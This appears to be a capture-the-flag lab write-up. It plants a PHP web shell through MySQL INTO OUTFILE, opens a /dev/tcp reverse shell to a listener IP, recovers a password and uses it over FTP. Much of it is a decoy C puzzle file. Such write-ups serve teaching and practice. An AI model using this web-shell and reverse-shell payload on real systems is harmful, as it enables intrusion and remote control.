[See detailed writeup here](../writeup1.md)

After connecting to the database as root, we start a reverse shell with the following command:

```
SELECT '<?php system("bash -c \'sh -i >& /dev/tcp/172.28.104.151/4242 0>&1\'"); ?>' 
INTO OUTFILE '/var/www/forum/templates_c/rev.php'
```

>After the **/dev/tcp/**, we need to enter the IP address and port of the computer we are listening on. I wrote it this way because my current computer's IP address is 172.28.104.151.
>
>From here on, since we have terminal access, the content is identical to what we've written in the other writeups.


```
$ cat /home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"
```

---

> # Part in common with other writemeup files


Yes, we got our password. Let's see where we can use it.


Remember:

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

We obtained these at the beginning of the project.

When we tried our username and password over SSH, we noticed it didn't work, but it works over FTP.

```
lmezard:G!@M6f4Eatau{sF"
```

```
PS C:\Users\Admin> ftp 192.168.193.128
Connected to 192.168.193.128.
220 Welcome on this server
200 Always in UTF8 mode.
User (192.168.193.128:(none)): lmezard
331 Please specify the password.
Password:

230 Login successful.
ftp>
```


```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
README
fun
226 Directory send OK.
ftp: 16 bytes received in 0.00Seconds 16000.00Kbytes/sec.
```

We see two files here: **`README and fun`** and we download them to our computer.

```
get README
get fun
```

Later we read the README.

```
PS C:\Users\Admin\Desktop> cat README

Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Now let's solve our little challenge.

```
luji/mnt/c/Users/Admin/Desktop:file fun
fun: POSIX tar archive (GNU)
```

When we open this rar archive, we see a folder named **`ft_fun`** containing 750 **`.pcap`** files.

We notice that one of them has a larger byte value than the others.

```
[***]
-rwxrwxrwx 1 luji    44 Aug 13  2015 BI0RD.pcap
-rwxrwxrwx 1 luji 32096 Aug 13  2015 BJPCP.pcap
-rwxrwxrwx 1 luji    43 Aug 13  2015 BN32A.pcap
[***]
```

We wanted to examine this directly and when we opened it, we found:


```
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
} */
char getme8() {
    return 'w';
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}*/
char getme9() {
    return 'n';
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}*/
char getme10() {
    return 'a';
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}*/
char getme11() {
    return 'g';
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}*/
char getme12()
{
    return 'e';
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}*/
int main() {
    printf("M");
    printf("Y");
    printf(" ");
    printf("P");
    printf("A");
    printf("S");
    printf("S");
    printf("W");
    printf("O");
    printf("R");
    printf("D");
    printf(" ");
    printf("I");
    printf("S");
    printf(":");
    printf(" ");
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
    printf("Now SHA-256 it and submit");
}
/*
void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
